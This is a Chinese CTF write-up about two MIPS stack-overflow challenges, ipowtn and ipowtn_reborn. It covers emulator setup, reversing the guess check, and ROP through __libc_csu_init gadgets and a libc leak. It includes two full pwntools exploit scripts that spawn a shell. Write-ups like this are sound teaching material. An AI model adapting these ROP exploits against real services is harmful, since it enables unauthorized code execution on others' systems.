# 从网鼎杯(第四场)的两题MIPS PWN谈起

阅读量 **259614**

|评论 **4**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2018-09-05 11:30:42

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p0.ssl.qhimg.com/t01797a7d5670028783.jpg)

## 0x001 start

调试`mips`就首先要有个`mips`的环境，推荐[mips
qcow2](https://people.debian.org/~aurel32/qemu/mips)

下载完成后用`qemu mips`起，`apt-get`安装好需要的相关工具

    
    
    #!/bin/bash
    qemu-system-mips -M malta 
        -kernel vmlinux-3.2.0-4-4kc-malta 
        -hda debian_wheezy_mips_standard.qcow2 
        -append "root=/dev/sda1 console=tty0" 
        -netdev user,id=net0 
        -device e1000,netdev=net0,id=net0,mac=52:54:00:c9:18:27 
        -net user -redir tcp:2222::22 -redir tcp:22333::22333 -redir tcp:1234::1234
    

## 0x002 基础知识

查阅相关资料可以得知，`mips`寄存器作用，和函数调用时候的一些信息。

  * `a0-a3`: 存储参数
  * `fp`: `fram pointer`，用来恢复栈之类的操作，可以理解为和`ebp`差不多的作用
  * `sp`: 存储栈地址
  * `v0...`: 存储一些变量或地址
  * `t8,t9`: 临时寄存器，`t9`常常用来调用函数。如`alarm`的`plt`调用如下

    
    
    .plt:00400820                   alarm:
    .plt:00400820 3C 0F 00 41                       lui     $t7, 0x41  # 'A'
    .plt:00400824 8D F9 14 44                       lw      $t9, off_411444
    .plt:00400828 03 20 00 08                       jr      $t9
    .plt:0040082C 25 F8 14 44                       addiu   $t8, $t7, (off_411444 - 0x410000)

需要主要的是`jr, jalr`等跳转指令有个特点  
  
它会先执行跳转指令的后一条指令，然后再跳转。

## 0x003 reverse

程序关键的地方在`0x400C30`，其他地方的话过一下就清楚是干什么的。

###  check

对程序进行分析，首先`checksec`，最好用`mips`环境的`gdb`来查看，`x86`的`gdb`看会有些问题

    
    
    CANARY    : disabled
    FORTIFY   : disabled
    NX        : ENABLED
    PIE       : disabled
    RELRO     : disabled
    

开了`NX`，`libc`库也是随机加载的。

###  vuln

漏洞点很容易发现，在`0x400FF8`，往栈上读了`0x400`字节，但实际上缓冲区没这么大。

    
    
    .text:00400C30 var_3C          = -0x3C
    .text:00400C30 var_38          = -0x38
    .text:00400C30 var_34          = -0x34
    .text:00400C30 var_30          = -0x30
    .text:00400C30 var_14          = -0x14
    .text:00400C30 var_10          = -0x10
    .text:00400C30 var_C           = -0xC
    .text:00400C30 var_8           = -8
    ; ....
    .text:00400FEC                 addiu   $v0, $fp, 0xD8+var_30
    .text:00400FF0                 move    $a0, $v0
    .text:00400FF4                 li      $a1, 0x400
    .text:00400FF8                 jal     readn_400B38
    .text:00400FFC                 move    $at, $at

> `readn_400B38`是一个字节一个字节的读，读到回车或者到了`0x400-1`就返回。

###  逻辑

漏洞很好找，那么我们就需要到达漏洞点。

`0x400C30`中逻辑如下：

  1. 栈上一片缓冲区初始化为`0x401364`等地方的字符串，计为`alph0`。(`We, are`等)
  2. 循环8次，每次随机选`alph0[len(alph0)/2:]`和`alph0[:len(alph0)/2]`两个部分的一个串交换。
  3. 又一个循环，每次将我们的输入字符串和`alph0[i]`比较(每次都比较到我们输对了为止)
  4. 计算`3`所用时间是不是小于`3s`，如果成立，就让我们到达漏洞点输入`0x400`

###  爆破

关于如何输对字符串，我们可以调试看看字符串变成什么样子，然后爆破，通过测试，字符串序列可以如下：

    
    
    guesslist = ["nomal", "arch", "bcz", "W3Are", "We", "are", "grad", "from"]
    for c in range(11, 0x100):
        guesslist.append("hakker"+chr(c)+"h")
    for c in range(22, 0x100):
        guesslist.append("hakker"+chr(c)+"d")
    

## 0x004 rop

由于对`mips`不熟悉，在这里卡了挺久。

###  ipowtn(without libc)

**sigh**

开始看到`0x400A9C`的`system("/bin/sh")`很高兴，但是地址是带`x0A`，不能直接跳过去。

所以就要设置参数`a0`为`"/bin/sh"`，然后跳到`system`，但是`MIPS`的`rop`没有直接能设置参数的

> 如`0x00401208: move $a0, $s3; move $a1, $s4; jalr
> $t9;`，要设置`t9`，但是并没有合适的`gadget`。

**debug**

    
    
    .text:00401200 lw $t9, 0($s1)
    .text:00401204 addiu $s0, 1
    .text:00401208 move $a0, $s3
    .text:0040120C move $a1, $s4
    .text:00401210 jalr $t9
    .text:00401214 move $a2, $s5
    .text:00401218 sltu $v0, $s0, $s2
    .text:0040121C bnez $v0, loc_401200
    .text:00401220 addiu $s1, 4
    .text:00401224
    .text:00401224 loc_401224: # CODE XREF: __libc_csu_init+60↑j
    .text:00401224 lw $ra, 0x38+var_4($sp)
    .text:00401228 lw $s5, 0x38+var_8($sp)
    .text:0040122C lw $s4, 0x38+var_C($sp)
    .text:00401230 lw $s3, 0x38+var_10($sp)
    .text:00401234 lw $s2, 0x38+var_14($sp)
    .text:00401238 lw $s1, 0x38+var_18($sp)
    .text:0040123C lw $s0, 0x38+var_1C($sp)
    .text:00401240 jr $ra
    .text:00401244 addiu $sp, 0x38

`__libc_csu_init+60`里面直接设置好参数，然后跳转到`0x00401200`，然后`jalr
$t9`调用`system[@got](https://github.com/got "@got")`。

然而，实际上会发现，`jalr $t9`之后并没有进真实到`system`，调的是`read`。

    
    
    Breakpoint 3, 0x77f860f4 in ?? () from /lib/ld.so.1
    gdb-peda$ x/10i $pc
    => 0x77f860f4:    jr    t9
    gdb-peda$ x/4i $t9
       0x77ec9bf8 <read>:    lui    gp,0xa
       0x77ec9bfc <read+4>:    addiu    gp,gp,23928
       0x77ec9c00 <read+8>:    addu    gp,gp,t9
       0x77ec9c04 <read+12>:    0x7c03e83b
                t8       t9       k0       k1       gp       sp       s8       ra
     R24  f0000000 77ec9bf8 00000000 00000000 77fa7000 7fd7f0f8 00411420 00401218
    

了解`libc`库函数加载的都知道第一次掉没有调的函数前会有`ld`链接的操作，最后再跳到真正的`libc`地址。

我们看看`system[@plt](https://github.com/plt "@plt")`

    
    
    .plt:00400840                 lui     $t7, 0x41  # 'A'
    .plt:00400844                 lw      $t9, off_41144C
    .plt:00400848                 jr      $t9
    .plt:0040084C                 addiu   $t8, $t7, (off_41144C - 0x410000)
    

刚开始不是很理解我们`jalr $t9`调用`*system[@got](https://github.com/got "@got")`和这里有什么区别

但是仔细理解`jr`指令就发现`system[@plt](https://github.com/plt "@plt")`是先`addiu $t8, $t7,
(off_41144C - 0x410000)`，再跳转，`t8`之后用来计算出真正的`system`偏移。

而在我们`jalr $t9`调`*system[@got](https://github.com/got
"@got")`时，`t8`是`0x411430`，就是`read[@got](https://github.com/got "@got")`。

那么我们要调用`system`，要么设置好`t8`再跳`*system[@got](https://github.com/got
"@got")`，要么直接跳`system[@plt](https://github.com/plt
"@plt")`。由于`mips`的`gadget`不像`x86`那么随意，还是跳`system[@plt](https://github.com/plt
"@plt")`比较容易。

**trick**

`.text:00401210 jalr $t9` 之后还有一个`gadget`，我们很容易使得`.text:00401240 jr
$ra`的`$ra`为`system[@plt](https://github.com/plt "@plt")`，接下来就是参数。

其实我们可以发现，`jalr $t9`调用之后，`a0`是不变的，因为函数的返回值存在`v0,v1`里面。

所以我们可以直接在栈上再布好`gadget`

  1. `0x00401224`设置好`s0-s5`
  2. `0x00401200`配好函数参数调用假的`system`，之后`a0`还是指向我们设置到值
  3. 程序往下走到`0x00401224`，设置`$ra`到`plt[@system](https://github.com/system "@system")`，调用真正的`system`

**exp**

    
    
    #coding: utf-8
    from pwn import *
    import sys
    
    LOCAL = True
    context.arch = 'mips'
    context.endian = 'big'
    
    sysshell = 0x400A9C
    if LOCAL:
        elf = ELF("./ipowtn")
        #io = remote("10.211.55.3", 22333)
        io = remote("127.0.0.1", 22333)
        #context.log_level = True
    else:
        io = remote("106.75.64.188", 18067)
        #context.log_level = True
    
    guesslist = ["nomal", "arch", "bcz", "W3Are", "We", "are", "grad", "from"]
    
    for c in range(11, 0x100):
        guesslist.append("hakker"+chr(c)+"h")
    for c in range(22, 0x100):
        guesslist.append("hakker"+chr(c)+"d")
    
    #context.log_level = 'debug'
    #pause()
    flg_success = 0
    timesp = 0
    def guessn():
        global flg_success
        global timesp
        if timesp > 20000:
            io.close()
            sys.exit(0)
        for gstr in guesslist:
            #print "testing", gstr
            if len(gstr) >= 8:
                #pause()
                io.send(gstr)
            else:
                io.sendline(gstr)
            try:
                data = io.recvline(timeout=0.1)
                timesp += 1
                #data = io.recvline()
                if len(data) > 5 and "guess it!!!!!!" in data:
                    continue
                elif len(data) >= 1 and len(data)<=4:
                    log.success("guess over!!!!!!!!!!")
                    return 1
                else:
                    flg_success += 1
                    log.success("ok is "+gstr)
                    if flg_success >= 9:
                        return 1
                    else:
                        return 0
            except:
                return 0
            finally:
                pass
    
    log.info("starting guess")
    while True:
        #pause()
        if guessn() == 1:
            break
    
    io.recvuntil("... go!n")
    payload = 0x20*chr(0)
    payload += p32(0x411420)    # fp
    payload += p32(0x401224)
    payload += 'b'*0x24
    # s0 s1 s2 s3 s4 s5 ra
    #payload += p32(0) + p32(0x411438) + p32(1) + p32(0x401320) + p32(0) + p32(0)
    # system got
    payload += p32(0) + p32(0x41144C) + p32(1) + p32(0x401320) + p32(0) + p32(0)
    # 0x00401200: lw $t9, ($s1); addiu $s0, $s0, 1; move $a0, $s3; move $a1, $s4; jalr $t9;
    payload += p32(0x00401200)  # ra
    payload += 0x34*chr(0)
    payload += p32(0x400840)    # plt system
    pause()
    io.sendline(payload)
    pause()
    io.interactive()
    

###  ipowtn_reborn(with libc)

第二题后来看了，和第一个的区别就是没有`system`在`got`里。所以需要泄漏`libc`并且在`libc`里找`system`字符串。

比赛也结束了，所以我就直接用自己的`libc`搞搞了。

**emmmm…**

我的方法并没有用第一个题的方法去调`printf`，而是直接跳到`0x400F0C`，原因是这里

    
    
    .text:00400F0C 02 00 20 21                 move    $a0, $s0         # format
    .text:00400F10 44 07 A0 00                 mfc1    $a3, $f20
    .text:00400F14 44 06 A8 00                 mfc1    $a2, $f21
    .text:00400F18 0C 10 01 F0                 jal     printf

`s0`直接就是我们第一个参数，我们在第一次栈溢出的时候就可以设置了。

而且跳到这里还有好处就是泄漏完了，立马再进行栈溢出。`libc`的`rop`相对来说就为所欲为了。具体可以参考`exp`。

**exp**

    
    
    #coding: utf-8
    from pwn import *
    import sys
    
    LOCAL = True
    context.arch = 'mips'
    context.endian = 'big'
    
    sysshell = 0x400A9C
    if LOCAL:
        elf = ELF("./ipowtn_reborn")
        #io = remote("10.211.55.3", 22333)
        io = remote("127.0.0.1", 22333)
        #context.log_level = True
    else:
        io = remote("106.75.64.188", 18067)
        #context.log_level = True
    
    guesslist = ["nomal", "arch", "bcz", "W3Are", "We", "are", "grad", "from"]
    
    for c in range(11, 0x100):
        guesslist.append("hakker"+chr(c)+"h")
    for c in range(22, 0x100):
        guesslist.append("hakker"+chr(c)+"d")
    
    #context.log_level = 'debug'
    #pause()
    flg_success = 0
    timesp = 0
    def guessn():
        global flg_success
        global timesp
        if timesp > 20000:
            io.close()
            sys.exit(0)
        for gstr in guesslist:
            #print "testing", gstr
            if len(gstr) >= 8:
                #pause()
                io.send(gstr)
            else:
                io.sendline(gstr)
            try:
                data = io.recvline(timeout=0.1)
                timesp += 1
                #data = io.recvline()
                if len(data) > 5 and "guess it!!!!!!" in data:
                    continue
                elif len(data) >= 1 and len(data)<=4:
                    log.success("guess over!!!!!!!!!!")
                    return 1
                else:
                    flg_success += 1
                    log.success("ok is "+gstr)
                    if flg_success >= 9:
                        return 1
                    else:
                        return 0
            except:
                return 0
            finally:
                pass
    
    log.info("starting guess")
    while True:
        #pause()
        if guessn() == 1:
            break
    
    io.recvuntil("... go!n")
    bss_addr = 0x4113C0
    # 0x00400788: lw $ra, 0x1c($sp); move $at, $at; jr $ra;
    payload = 0x1c*chr(0)
    payload += p32(elf.got["puts"])    # s0
    payload += p32(bss_addr)    # fp
    # printf
    payload += p32(0x400F0C)    # ra
    io.sendline(payload)
    data = io.recv(4)
    puts_addr = u32(data)
    log.info("puts address: " + hex(puts_addr))
    
    puts_offset = 0x6DEE0
    lk_stack_offset = 0x1873A4
    libc = ELF("../mipwn/libc-2.13.so")
    libc.address = puts_addr - puts_offset
    log.success("libc address is " + hex(libc.address))
    
    io.recvuntil("... go!n")
    
    binsh_addroff = 0x16516C
    system_off = 0x41DA0
    
    log.info("system address: " + hex(system_off+libc.address))
    payload = 'a'*0x1c
    payload += p32(binsh_addroff+libc.address)   # s0 /bin/sh
    payload += p32(bss_addr)   # fp
    # 0x000ef2fc: move $a0, $s0; lw $ra, 0x1c($sp); lw $s0, 0x18($sp); jr $ra;
    # 0x0006e630: move $a0, $s0; lw $ra, 0x2c($sp); lw $s0, 0x28($sp); jr $ra;
    payload += p32(0x000ef2fc+libc.address) # ra
    payload += 0x24*chr(0)
    # 0x13F198: lw $t9, 0xa0($sp); sw $t0, 0x18($sp); jalr $t9;
    log.info("at "+hex(0x13F198+libc.address))
    payload += p32(0x13F198+libc.address) # ra
    payload += 160*chr(0)
    payload += p32(system_off+libc.address)
    pause()
    io.sendline(payload)
    pause()
    io.interactive()
    

## 0x005 Summary

总的来说，就是包了个`mips`的栈溢出，其实不难，但是比赛的时候不熟悉，环境也没有，赛后查指令做了一天。。

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **wooy0ung** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/158673](/post/id/158673)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Pwn](/tag/Pwn)
  * [CTF](/tag/CTF)
  * [MIPS](/tag/MIPS)

 **+1** __9赞

 __收藏

![](https://p1.ssl.qhimg.com/t0131de115972950e64.png) wooy0ung

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

